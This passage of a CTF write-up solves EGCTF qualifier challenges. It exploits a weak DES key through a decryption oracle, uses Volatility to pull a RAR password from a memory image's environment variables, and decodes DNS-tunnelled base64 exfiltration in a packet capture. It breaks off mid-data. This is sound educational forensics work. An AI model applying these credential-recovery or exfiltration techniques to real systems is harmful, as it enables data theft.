<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# echo 1 | nc 167.71.93.117 9000 </span><br><span class="line">Name: Here is your personalized message: L8O@eMcǊN4X0FƤ߃&amp;</span><br><span class="line">                                                         [Mڸ&quot;*A!v.$.8v\G9(sK&#123;~L&#123;+</span><br><span class="line">qOw|,&gt;ԄB̃]R</span><br><span class="line"></span><br><span class="line">Bye</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# echo 1 | nc 167.71.93.117 9000 &gt; out.1</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# xxd out.1 </span><br><span class="line">00000000: 4e61 6d65 3a20 4865 7265 2069 7320 796f  Name: Here is yo</span><br><span class="line">00000010: 7572 2070 6572 736f 6e61 6c69 7a65 6420  ur personalized </span><br><span class="line">00000020: 6d65 7373 6167 653a 20b4 4c38 4f0f 4019  message: .L8O.@.</span><br><span class="line">00000030: e065 834d 63a3 f987 c78a 0195 ebf9 4e34  .e.Mc.........N4</span><br><span class="line">00000040: 5813 30c0 46c6 a480 df83 260c 5b4d dab8  X.0.F.....&amp;.[M..</span><br><span class="line">00000050: 199c c222 2a41 2176 2ea0 ebf9 2499 edfd  ...&quot;*A!v....$...</span><br><span class="line">00000060: 2e04 3876 5c47 d039 aa28 b073 a34b 14c5  ..8v\G.9.(.s.K..</span><br><span class="line">00000070: 7b8e efad 7ed6 cde0 de4c 7bc1 2b0a 8f71  &#123;...~....L&#123;.+..q</span><br><span class="line">00000080: 1c4f cde0 77d1 7c84 edeb 2c15 3e06 d484  .O..w.|...,.&gt;...</span><br><span class="line">00000090: 42ad cc83 1db5 5dd5 520a 0a42 7965       B.....].R..Bye</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure>
<p>I opened the file in <code>vi</code> and removed <code>Name: Here is your personalized message:</code> and <code>Bye</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# vi out.1</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# xxd out.1 </span><br><span class="line">00000000: b44c 384f 0f40 19e0 6583 4d63 a3f9 87c7  .L8O.@..e.Mc....</span><br><span class="line">00000010: 8a01 95eb f94e 3458 1330 c046 c6a4 80df  .....N4X.0.F....</span><br><span class="line">00000020: 8326 0c5b 4dda b819 9cc2 222a 4121 762e  .&amp;.[M.....&quot;*A!v.</span><br><span class="line">00000030: a0eb f924 99ed fd2e 0438 765c 47d0 39aa  ...$.....8v\G.9.</span><br><span class="line">00000040: 28b0 73a3 4b14 c57b 8eef ad7e d6cd e0de  (.s.K..&#123;...~....</span><br><span class="line">00000050: 4c7b c12b 0a8f 711c 4fcd e077 d17c 84ed  L&#123;.+..q.O..w.|..</span><br><span class="line">00000060: eb2c 153e 06d4 8442 adcc 831d b55d d552  .,.&gt;...B.....].R</span><br><span class="line">00000070: 0a0a                                     ..</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure>
<p>Then I sent the encrypted message as an input, and I successfully got back the decrypted message, that’s when I knew that my approach wasn’t intended because it wants the decryption key as the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# cat out.1 | nc 167.71.93.117 9000</span><br><span class="line">Name: Here is your personalized message: 1</span><br><span class="line"> Well done, now submit the key in hex format, for example, if the key is &#39;Winter&#39; submit EGCTF&#123;57696e746572&#125;  m&gt;eMcǊN4X0FƤ߃&amp;</span><br><span class="line">                                                                                                                            [Mڸ&quot;*A!v.$.8v\G9(sK&#123;~L&#123;+</span><br><span class="line">qOw|,&gt;ԄB̃]R</span><br><span class="line"></span><br><span class="line">Byeroot@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure>
<p>The hint said <code>Strong key!</code>, so it’s probably a weak one, and <code>DES</code> is known for some weak keys. I searched for weak <code>DES</code> keys and found <a href="https://en.wikipedia.org/wiki/Weak_key" target="_blank" rel="noopener">this Wikipedia page</a>. I used <a href="http://des.online-domain-tools.com/" target="_blank" rel="noopener">des.online-domain-tools.com</a> and started trying some of the keys, <code>0xFEFEFEFEFEFEFEFE</code> worked:<br><img src="/images/ctfs/egctf-qual/20.png" alt=""></p>
<h2 id="Forensics-Data-Leakage"><a href="#Forensics-Data-Leakage" class="headerlink" title="Forensics: Data Leakage"></a>Forensics: Data Leakage</h2><h3 id="Challenge-Description-7"><a href="#Challenge-Description-7" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We acquired this memory image from the computer of the main suspect in corporate espionage case. Could you help us find what had been leaked?</span><br><span class="line"></span><br><span class="line">flag: EGCTF&#123;md5_hex_lowercase&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution:"></a>Solution:</h3><p>We’re given a memory image called <code>memdump.mem</code>.<br>First thing I did was to check the image info (I used <code>volatility</code>):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;root&#x2F;Desktop&#x2F;eg-ctf-quals&#x2F;forensics&#x2F;dataleakage&#x2F;memdump.mem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0x31c000L</span><br><span class="line">                          KDBG : 0x80544ce0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 2</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2019-11-05 09:22:13 UTC+0000</span><br><span class="line">     Image local date and time : 2019-11-05 11:22:13 +0200</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure>
<p>Then I checked the processes:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 psscan</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(P)          Name                PID   PPID PDB        Time created                   Time exited                   </span><br><span class="line">------------------ ---------------- ------ ------ ---------- ------------------------------ ------------------------------</span><br><span class="line">0x000000000164bda0 svchost.exe         972    676 0x08600100 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x000000000164cda0 svchost.exe         912    676 0x086000e0 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x000000000165b230 svchost.exe        1220    676 0x08600160 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x0000000001664390 7zFM.exe           1144   1520 0x08600300 2019-11-05 09:21:53 UTC+0000</span><br><span class="line">0x00000000016ba020 smss.exe            540      4 0x08600020 2019-11-05 09:20:14 UTC+0000</span><br><span class="line">0x0000000001763680 alg.exe            1336    676 0x08600180 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000001777658 vmtoolsd.exe        444    676 0x08600220 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x000000000178e440 winlogon.exe        632    540 0x08600060 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000017eba78 VGAuthService.e     256    676 0x08600200 2019-11-05 09:20:37 UTC+0000</span><br><span class="line">0x00000000018044b8 explorer.exe       1520   1488 0x086001c0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x000000000181c3e8 csrss.exe           604    540 0x08600040 2019-11-05 09:20:15 UTC+0000</span><br><span class="line">0x0000000001838c10 lsass.exe           688    632 0x086000a0 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000018413e0 wuauclt.exe        1880   1112 0x086002c0 2019-11-05 09:21:30 UTC+0000</span><br><span class="line">0x0000000001854140 svchost.exe        1160    676 0x08600140 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x000000000189c2c8 WinRAR.exe         1308   1520 0x086002e0 2019-11-05 09:21:46 UTC+0000</span><br><span class="line">0x00000000018f64a0 rundll32.exe       1356   1520 0x08600260 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x000000000197d620 wscntfy.exe        1460   1112 0x086002a0 2019-11-05 09:21:45 UTC+0000</span><br><span class="line">0x00000000019a65b0 svchost.exe        1112    676 0x08600120 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x00000000019b4020 spoolsv.exe        1676    676 0x086001e0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x0000000001a16980 svchost.exe        2024    676 0x086001a0 2019-11-05 09:20:37 UTC+0000</span><br><span class="line">0x0000000001a18da0 wmiprvse.exe        740    912 0x08600240 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000001a97da0 vmacthlp.exe        896    676 0x086000c0 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x0000000001ab4da0 FTK Imager.exe      592   1520 0x08600320 2019-11-05 09:21:59 UTC+0000</span><br><span class="line">0x0000000001b0ad10 services.exe        676    632 0x08600080 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x0000000001b17808 vmtoolsd.exe       1496   1520 0x08600280 2019-11-05 09:20:46 UTC+0000</span><br><span class="line">0x0000000001bcb830 System                4      0 0x0031c000</span><br><span class="line">0x0000000002e9b440 winlogon.exe        632    540 0x08600060 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000035c5c10 lsass.exe           688    632 0x086000a0 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000035f0390 7zFM.exe           1144   1520 0x08600300 2019-11-05 09:21:53 UTC+0000</span><br><span class="line">0x00000000038b0680 alg.exe            1336    676 0x08600180 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000008cd14b8 explorer.exe       1520   1488 0x086001c0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x0000000008da9da0 wmiprvse.exe        740    912 0x08600240 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000008f02020 spoolsv.exe        1676    676 0x086001e0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x000000000908b620 wscntfy.exe        1460   1112 0x086002a0 2019-11-05 09:21:45 UTC+0000</span><br><span class="line">0x00000000090c6da0 FTK Imager.exe      592   1520 0x08600320 2019-11-05 09:21:59 UTC+0000</span><br><span class="line">0x00000000091ded10 services.exe        676    632 0x08600080 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x000000000920e3e0 wuauclt.exe        1880   1112 0x086002c0 2019-11-05 09:21:30 UTC+0000</span><br><span class="line">0x00000000092e7230 svchost.exe        1220    676 0x08600160 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x00000000092e8da0 vmacthlp.exe        896    676 0x086000c0 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure>
<p>And I dumped the files:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# mkdir files</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 dumpfiles -D .&#x2F;files&#x2F;</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">DataSectionObject 0x81862510   4      \Device\HarddiskVolume1\WINDOWS\system32\config\SECURITY</span><br><span class="line">SharedCacheMap 0x81862510   4      \Device\HarddiskVolume1\WINDOWS\system32\config\SECURITY</span><br><span class="line">DataSectionObject 0x814ba320   4      \Device\HarddiskVolume1\WINDOWS\system32\config\software</span><br><span class="line">---</span><br><span class="line">ImageSectionObject 0x8163b950   592    \Device\HarddiskVolume1\WINDOWS\system32\msvcr71.dll</span><br><span class="line">DataSectionObject 0x8163b950   592    \Device\HarddiskVolume1\WINDOWS\system32\msvcr71.dll</span><br><span class="line">ImageSectionObject 0x8181eb78   592    \Device\HarddiskVolume1\WINDOWS\system32\mshtml.dll</span><br><span class="line">DataSectionObject 0x8181eb78   592    \Device\HarddiskVolume1\WINDOWS\system32\mshtml.dll</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure>
<p>I ran the <code>file</code> command on all the dumped files and found 2 <code>RAR</code> archives:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# cd files&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage&#x2F;files# file *</span><br><span class="line">file.1112.0x8144bae8.img:  PE32 executable (DLL) (GUI) Intel 80386, for MS Windows</span><br><span class="line">file.1112.0x81463a10.img:  PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">file.1112.0x814646e0.img:  PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">---</span><br><span class="line">file.1144.0x8147e6c8.dat:  RAR archive data, v5</span><br><span class="line">file.1144.0x81583d98.vacb: RAR archive data, v5</span><br><span class="line">---</span><br><span class="line">file.972.0x8183a6e0.img:   PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">file.972.0x8183aae8.img:   PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">file.972.0x8183af30.img:   PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage&#x2F;files#</span><br></pre></td></tr></table></figure>
<p>Both of them had an image called <code>flag.png</code> and both of them were password protected:<br><img src="/images/ctfs/egctf-qual/21.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/22.png" alt=""><br>Earlier when I ran <code>psscan</code> there was a <code>WinRAR</code> process running (<code>PID</code> : 1308 ): </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 psscan</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(P)          Name                PID   PPID PDB        Time created                   Time exited                   </span><br><span class="line">------------------ ---------------- ------ ------ ---------- ------------------------------ ------------------------------</span><br><span class="line">---</span><br><span class="line">0x000000000189c2c8 WinRAR.exe         1308   1520 0x086002e0 2019-11-05 09:21:46 UTC+0000</span><br><span class="line">---</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure>
<p>I checked the environment variables of that process and found the password there:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 envars -p 1308</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Pid      Process              Block      Variable                       Value</span><br><span class="line">-------- -------------------- ---------- ------------------------------ -----</span><br><span class="line">    1308 WinRAR.exe           0x00010000 ALLUSERSPROFILE                C:\Documents and Settings\All Users</span><br><span class="line">    1308 WinRAR.exe           0x00010000 APPDATA                        C:\Documents and Settings\Administrator\Application Data</span><br><span class="line">    1308 WinRAR.exe           0x00010000 CLIENTNAME                     Console</span><br><span class="line">    1308 WinRAR.exe           0x00010000 CommonProgramFiles             C:\Program Files\Common Files</span><br><span class="line">    1308 WinRAR.exe           0x00010000 COMPUTERNAME                   EGCTF-FEDB3D835</span><br><span class="line">    1308 WinRAR.exe           0x00010000 ComSpec                        C:\WINDOWS\system32\cmd.exe</span><br><span class="line">    1308 WinRAR.exe           0x00010000 FP_NO_HOST_CHECK               NO</span><br><span class="line">    1308 WinRAR.exe           0x00010000 HOMEDRIVE                      C:</span><br><span class="line">    1308 WinRAR.exe           0x00010000 HOMEPATH                       \Documents and Settings\Administrator</span><br><span class="line">    1308 WinRAR.exe           0x00010000 LOGONSERVER                    \\EGCTF-FEDB3D835</span><br><span class="line">    1308 WinRAR.exe           0x00010000 NUMBER_OF_PROCESSORS           1</span><br><span class="line">    1308 WinRAR.exe           0x00010000 OS                             Windows_NT</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PASSWORD                       th!s!sg00d</span><br><span class="line">    1308 WinRAR.exe           0x00010000 Path                           C:\Program Files\WinRAR;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_ARCHITECTURE         x86</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_IDENTIFIER           x86 Family 6 Model 158 Stepping 9, GenuineIntel</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_LEVEL                6</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_REVISION             9e09</span><br><span class="line">    1308 WinRAR.exe           0x00010000 ProgramFiles                   C:\Program Files</span><br><span class="line">    1308 WinRAR.exe           0x00010000 SESSIONNAME                    Console</span><br><span class="line">    1308 WinRAR.exe           0x00010000 SystemDrive                    C:</span><br><span class="line">    1308 WinRAR.exe           0x00010000 SystemRoot                     C:\WINDOWS</span><br><span class="line">    1308 WinRAR.exe           0x00010000 TEMP                           C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">    1308 WinRAR.exe           0x00010000 TMP                            C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">    1308 WinRAR.exe           0x00010000 USERDOMAIN                     EGCTF-FEDB3D835</span><br><span class="line">    1308 WinRAR.exe           0x00010000 USERNAME                       Administrator</span><br><span class="line">    1308 WinRAR.exe           0x00010000 USERPROFILE                    C:\Documents and Settings\Administrator</span><br><span class="line">    1308 WinRAR.exe           0x00010000 windir                         C:\WINDOWS</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure>

<p><img src="/images/ctfs/egctf-qual/23.png" alt=""><br><code>flag.png</code>:<br><img src="/images/ctfs/egctf-qual/24.png" alt=""></p>
<h2 id="Forensics-Oh-My-Salary"><a href="#Forensics-Oh-My-Salary" class="headerlink" title="Forensics: Oh My Salary!"></a>Forensics: Oh My Salary!</h2><h3 id="Challenge-Description-8"><a href="#Challenge-Description-8" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List of employees with their salaries had been leaked. Here is the traffic captured from the network. It may contain the leaked data. Can you help?</span><br><span class="line"></span><br><span class="line">Flag Format: EGCTF&#123;md5_hex_lowercase&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution:"></a>Solution:</h3><p>We’re given a <code>pcapng</code> file called <code>salary_traffic.pcapng</code>, by looking at the capture in <code>wireshark</code> and sorting the packets according to their protocol I noticed a bunch of weird <code>DNS</code> queries:<br><img src="/images/ctfs/egctf-qual/25.png" alt=""><br>All of them were looking up the same domain <code>example.test</code> with different <code>base-64</code> encoded strings as subdomains.<br>I used <code>tshark</code> to extract all of these <code>DNS</code> queries and I saved them into a file: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# tshark -r .&#x2F;salary_traffic.pcapng -T fields -e ip.src -e dns.qry.name &quot;dns.flags.response eq 0 and dns.qry.name contains example.test&quot;</span><br><span class="line">Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.</span><br><span class="line">192.168.125.145 N3q8ryccAATIxWF+.example.test</span><br><span class="line">192.168.125.145 8AoAAAAAAAB6AAAA.example.test</span><br><span class="line">192.168.125.145 AAAAANY3kCg6AWnJ.example.test</span><br><span class="line">192.168.125.145 Ic9uESaH5GfcRZ9l.example.test</span><br><span class="line">192.168.125.145 KuuWZ&#x2F;LK8Hnb\nmS+.example.test</span><br><span class="line">---</span><br><span class="line">192.168.125.145 GQAYQB0AGEALgB0A.example.test</span><br><span class="line">192.168.125.145 HgAdAAAABQKAQDQb.example.test</span><br><span class="line">192.168.125.145 KHeApTVARUGAQAgA.example.test</span><br><span class="line">192.168.125.145 AAAAAA&#x3D;\n.example.test</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# tshark -r .&#x2F;salary_traffic.pcapng -T fields -e ip.src -e dns.qry.name &quot;dns.flags.response eq 0 and dns.qry.name contains example.test&quot; &gt; out.txt</span><br><span class="line">Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>
<p>Then by using a text editor I removed the ip address, <code>.example.test</code> and the new lines:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# cat out.txt </span><br><span class="line">N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb\nmS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz\nJQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K67BU5vI+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG\nzoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD\nohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa\nUosmZu9rUICrUlRcskmZDD25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb\n3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL\nO2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUYYfTAlI\nfyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL\nF0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO\nH0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7DALF6zI9NzEIMp61r0ZISAC5RBir+3\nIk5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF\nqlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit\njkjUmRQoatL1RVQMbyp9KBkyRnjFUs9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA\n&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNo